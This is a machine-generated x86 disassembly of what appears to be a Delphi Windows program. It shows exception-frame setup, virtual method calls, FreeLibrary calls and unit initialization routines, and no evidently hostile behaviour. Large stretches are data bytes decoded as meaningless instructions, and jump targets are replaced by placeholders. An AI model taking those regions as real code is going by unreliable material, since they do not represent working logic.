sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_418cf8
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403518
test al al
je r-xdata
sub_430618
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_418d54
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_44e4c0
mov eax ebx
mov si 0xffeb
call sub_403518
sub_430650
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_4307c8
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_4306c4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4301e8
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_418de0
call sub_40331c
pop edi
pop esi
pop ebx
retn
sub_430704
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_430480
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43073c
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_418cf8
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_418cf8
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_4307c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_430891
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_4306c4
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_430480
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430898
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_418cf8
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_418cf8
pop edx
call sub_44e8e4
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_4308a0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_4545a0
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_418cf8
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_430917
add [ edi ] ah
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
jbe r-xdata
push ss
add [ 0x640000ff ] ch
jbe r-xdata
push es
add [ 0x640000ff ] bl
jbe r-xdata
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
jbe r-xdata
pop ss
add [ esi ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
jbe r-xdata
aam 0x49
add [ 0x640000ff ] cl
jbe r-xdata
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
jbe r-xdata
pop es
add [ esi ] bl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi ] bl
push ds
add [ 0x640000ff ] dl
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430c4b
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404bb4
int3
dec ecx
add [ edx + ecx + 0x49cc0043 ] al
dec ecx
add [ edx + ecx + 0x43 ] bh
add ah al
dec ecx
dec ecx
add [ edx + ecx + 0x43 ] dh
add [ ecx + ecx * 2 + 0xa6c0049 ] bh
inc ebx
add [ ecx + ecx * 2 + 0xa640049 ] dh
inc ebx
add [ ecx + ecx * 2 + 0xa5c0049 ] ch
inc ebx
add [ ecx + ecx * 2 + 0xa540049 ] ah
inc ebx
add [ ecx + ecx * 2 + 0xa4c0049 ] bl
inc ebx
add [ ecx + ecx * 2 + 0xa440049 ] dl
inc ebx
add [ ecx + ecx * 2 + 0xa3c0049 ] cl
inc ebx
add [ ecx + ecx * 2 + 0xa340049 ] al
inc ebx
add [ ecx + ecx * 2 + 0x49 ] bh
add [ edx + ecx ] ch
inc ebx
add [ ecx + ecx * 2 + 0x49 ] dh
add [ edx + ecx ] ah
inc ebx
add [ ecx + ecx * 2 + 0x49 ] ch
add [ edx + ecx ] bl
inc ebx
add [ ecx + ecx * 2 + 0x49 ] ah
add [ edx + ecx ] dl
inc ebx
add [ ecx + ecx * 2 + 0x49 ] bl
add [ edx + ecx ] cl
inc ebx
add [ ecx + ecx * 2 + 0x49 ] dl
add [ edx + ecx ] al
inc ebx
add [ ecx + ecx * 2 + 0x49 ] cl
add ah bh
or [ ebx ] eax
inc esp
dec ecx
dec ecx
add ah dh
or [ ebx ] eax
cmp al 0x49
dec ecx
add ah ch
or [ ebx ] eax
xor al 0x49
dec ecx
add ah ah
or [ ebx ] eax
sub al 0x49
dec ecx
add ah bl
or [ ebx ] eax
and al 0x49
dec ecx
add ah dl
or [ ebx ] eax
sbb al 0x49
dec ecx
add ah cl
or [ ebx ] eax
adc al 0x49
dec ecx
add ah al
or [ ebx ] eax
or al 0x49
dec ecx
add [ ecx + ecx + 0x49040043 ] bh
dec ecx
add [ ecx + ecx + 0x48fc0043 ] dh
dec ecx
add [ ecx + ecx + 0x48f40043 ] ch
dec ecx
add [ ecx + ecx + 0x48ec0043 ] ah
dec ecx
add [ ecx + ecx + 0x48e40043 ] bl
dec ecx
add [ ecx + ecx + 0x48dc0043 ] dl
dec ecx
add [ ecx + ecx + 0x48d40043 ] cl
dec ecx
add [ ecx + ecx + 0x48cc0043 ] al
dec ecx
add [ ecx + ecx + 0x43 ] bh
add ah al
dec eax
dec ecx
add [ ecx + ecx + 0x43 ] dh
add [ eax + ecx * 2 + 0x96c0049 ] bh
inc ebx
add [ eax + ecx * 2 + 0x9640049 ] dh
inc ebx
add [ eax + ecx * 2 + 0x95c0049 ] ch
inc ebx
add [ eax + ecx * 2 + 0x9540049 ] ah
inc ebx
add [ eax + ecx * 2 + 0x94c0049 ] bl
inc ebx
add [ eax + ecx * 2 + 0x9440049 ] dl
inc ebx
add [ eax + ecx * 2 + 0x93c0049 ] cl
inc ebx
add [ eax + ecx * 2 + 0x9340049 ] al
inc ebx
add [ eax + ecx * 2 + 0x49 ] bh
add [ ecx + ecx ] ch
inc ebx
add [ eax + ecx * 2 + 0x49 ] dh
add [ ecx + ecx ] ah
inc ebx
add [ eax + ecx * 2 + 0x49 ] ch
add [ ecx + ecx ] bl
inc ebx
add [ eax + ecx * 2 + 0x49 ] ah
add [ ecx + ecx ] dl
inc ebx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430c44
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ esi ] cl
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi ] cl
inc [ eax ]
push cs
add [ 0x640000ff ] al
jbe r-xdata
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
jbe r-xdata
pop ds
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi ] dl
add [ esi ] dl
add [ esi + esi * 2 + 0x49 ] ah
add al dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add ah dl
dec ecx
ud0 eax [ eax ]
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add [ edi ] al
add [ esi ] al
sub_430c83
add dh dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bh dh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add al bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add cl bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dl bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add bl bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ah bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add ch bh
inc [ eax ]
add [ esi + esi * 2 + 0x49 ] ah
add dh bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430ced
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430cf4
retn
sub_430d00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430d31
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430d38
retn
mov eax [ rw-data ]
call sub_40331c
sub_430de8
or al [ eax ]
add [ eax ] al
add [ edx + 0x49 ] cl
add [ esi + ebx * 2 + 0x49 ] al
add [ eax ] al
add [ eax ] al
add ah bh
dec ecx
dec ecx
add [ esp + ebx * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
add al bh
dec ecx
dec ecx
add ah ah
pop ebx
dec ecx
add [ eax ] al
add [ eax ] al
add ah dh
dec ecx
dec ecx
add [ eax + 0x5d ] dl
dec ecx
add [ eax ] al
add [ eax ] al
add al dh
dec ecx
dec ecx
add [ eax + 0x495e ] cl
add [ eax ] al
add ah ch
dec ecx
dec ecx
add [ eax + 0x4961 ] ah
add [ eax ] al
add al ch
dec ecx
dec ecx
add ah dl
pop esi
dec ecx
add [ eax ] al
add [ eax ] al
add ah ah
dec ecx
dec ecx
add [ edi + ebx * 2 + 0x49 ] ah
add [ eax ] al
loopne r-xdata
pop ebp
retn
dec ecx
add [ eax + 0x61 ] ah
dec ecx
add [ eax ] al
add [ eax ] al
add ah bl
dec ecx
dec ecx
add [ eax ] bl
pop esp
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430e90
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
call sub_430dcc
sub_430ec4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_430ee9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430ef0
retn
sub_430f0b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430f50
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430f57
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404bb4
sub_430f73
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_430fb8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430fbf
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404bb4
sub_430fcf
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_431025
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43102c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404118
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_431038
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43107c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431083
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_431681
adc eax 0x14ec0043
inc ebx
add [ ecx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ eax ] al
add [ fs : eax ] al
call [ eax - 0x4f ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
popad
jo r-xdata
add [ eax ] al
adc [ eax ] al
mov al [ 0xffffffffe0ff0000 ]
and al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
mov eax 0x10045b2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
add [ eax ] cl
push ebx
push 0x4374726f
adc [ eax ] al
enter 0x0 0xff
dec esp
and al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
insd
popad
push es
dec ecx
inc ecx
add [ eax + eax ] dh
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
adc eax [ ebx ]
mov eax 0xb8ff0000
add [ eax ] al
inc [ ecx ]
enter 0x45a6 0x0
inc esp
mov dh 0x45
add [ esi + esi * 4 + 0x45 ] ch
add [ eax + 0x45b6 ] ah
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000b ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
jae r-xdata
outsd
outsb
je r-xdata
adc [ eax ] al
push es
dec edi
outsb
dec eax
imul ebp [ esi + 0x74 ] 0x1894c08b
inc ebx
add [ eax ] cl
or eax 0x74654754
dec ecx
je r-xdata
je r-xdata
adc eax [ ebx ]
push ebx
push 0x4374726f
jne r-xdata
js r-xdata
js r-xdata
add [ eax ] al
test [ ecx ] bl
insd
inc ebp
jbe r-xdata
add [ ebx ] al
or [ esi ] al
insd
inc ebx
outsd
jne r-xdata
je r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
rol [ eax ] 0x0
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
jae r-xdata
add [ eax + 0x49060008 ] al
pop ebp
inc ecx
add [ eax + eax - 0x4b530100 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
add [ eax ] al
sub al 0x14
inc ebx
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add al [ 0x65646e49 ]
js r-xdata
push esp
inc ebx
jne r-xdata
jae r-xdata
je r-xdata
push esp
xor eax 0x32b40040
inc eax
add al dl
xor al [ eax ]
jl r-xdata
jb r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
adc [ ebp + 0x10045 ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x1c656c62
adc eax 0xd00043
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6e4f0900
inc edi
je r-xdata
insd
jne r-xdata
inc ebx
add bh bh
add [ fs : eax ] al
je r-xdata
pop eax
xor eax 0x1b400040
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
or [ ecx + ecx * 2 ] eax
dec ecx
outsb
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
xor eax 0x355c0040
inc eax
je r-xdata
add [ ebp + esi + 0x40 ] bl
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000e ] al
outsb
inc edi
je r-xdata
add bh bh
mov eax 0x1ff0000
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add al ch
inc ecx
jae r-xdata
je r-xdata
add al 0x49
dec ecx
je r-xdata
je r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
imul ebp [ edi + 0x6e ] r-xdata
push 0x0
add bh bh
mov eax 0x10045b2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
jl r-xdata
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
inc ebx
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
sbb al [ ebx ]
loopne r-xdata
je r-xdata
inc eax
add [ eax + ebx * 4 + 0x41 ] bh
shl [ edx ] 0x1
insd
adc [ esp + ecx * 2 + 0x69 ] dl
inc eax
add [ eax + 0x35 ] bl
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
add [ eax - 0x63 ] bl
insb
dec ecx
je r-xdata
inc ecx
inc ebx
outsd
outsb
je r-xdata
add [ eax - 0x80000000 ] al
nop
insd
add [ 0x6d657449 ] al
adc [ eax ] al
enter 0x0 0xff
dec esp
and al 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
insd
popad
push es
dec ecx
inc ecx
add [ eax + eax ] dh
dec [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
je r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add ah ch
inc eax
sbb eax [ edx ]
pushad
xor eax 0x35540040
inc eax
insd
jae r-xdata
cwde
inc ecx
add [ ebp + ebx * 4 + 0x41 ] dl
add [ eax ] al
push 0x4c004312
xor eax 0x35580040
insd
add ah ch
adc al 0x43
add [ eax + edx ] bh
inc eax
add [ ecx + edx ] ch
inc ebx
add [ ebx + 0x431940c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
sbb [ ebx ] eax
sub al 0x0
inc ecx
add ah bl
and eax 0x9d100043
inc ecx
add [ eax + 0x27 ] dh
inc ebx
add [ eax - 0x3ffbe67 ] al
cdq
inc ecx
add [ edi + ebx + 0x43 ] al
add [ eax ] dl
push esp
push ebx
je r-xdata
popfd
outsd
pop ebp
inc ecx
add [ eax + eax - 0x4b530100 ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
jae r-xdata
outsd
outsb
je r-xdata
adc al 0x43
add [ edx ] dl
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x74 ] edx
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx + 0x43 ] ch
add [ eax + eax ] ch
inc eax
add [ ecx + ebx + 0x10070043 ] al
push esp
push ebx
je r-xdata
insd
inc ebx
jne r-xdata
js r-xdata
js r-xdata
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
adc [ eax ] al
mov al [ 0xffffffffe0ff0000 ]
and al [ ebx ]
add [ eax ] eax
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx + 0x280043 ] dl
add [ eax ] al
loopne r-xdata
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
je r-xdata
adc eax [ ebx ]
rol [ eax ] 0x0
enter 0x45a6 0x0
inc esp
mov dh 0x45
add [ esi + esi * 4 + 0x45 ] ch
add [ eax + 0x45b6 ] ah
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ ebx ] eax
rol [ eax ] 0x1
add bh bh
mov eax 0x1004329
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905000a ] al
je r-xdata
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
add eax 0x6d657449
xchg esp eax
adc [ eax ] al
jl r-xdata
call [ eax - 0x4f ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
add [ eax ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
clc
sbb [ ebx ] eax
in al dx
sub [ ebx ] al
movsb [ edi ] [ esi ]
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ eax ] al
inc esp
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al bl
and al [ edx ]
lodsb [ esi ]
or eax 0x230c0045
inc edx
add [ eax ] bl
fadd [ eax + eax + 0x2c ]
sub al [ ebx ]
add [ eax + 0x4f060010 ] al
cmpsb [ esi ] [ edi ]
inc ebp
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebx
push 0x4374726f
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
insd
add bh bh
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ eax + 0x35 ] bl
inc eax
add [ eax + 0x1b ] al
je r-xdata
nop
and al [ edx ]
popad
je r-xdata
outsb
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
jae r-xdata
dec edi
add [ esi ] al
bound ebp [ ebp - 0x70 ]
sbb [ ebx ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
inc edi
je r-xdata
mov al 0x45
add ah dh
sbb eax 0x92f40042
inc ecx
add [ edx + 0x24280043 ] ch
inc edx
add [ ecx + ebp * 4 + 0x45 ] dh
add [ eax - 0x4b ] dh
inc ebp
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax + ebp + 0x24e80043 ] cl
inc edx
add [ esp + 0x22a80042 ] cl
inc ebx
add [ eax + 0x24 ] dl
inc edx
add [ eax + 0x21 ] cl
inc ebx
add al cl
stosb [ edi ]
inc ebp
add [ eax + 0x300045b3 ] bl
mov bl 0x45
add ah al
mov dh 0x45
add [ ecx + ebp ] bl
inc ebx
add [ ecx + ebp + 0x29c80043 ] dl
inc ebx
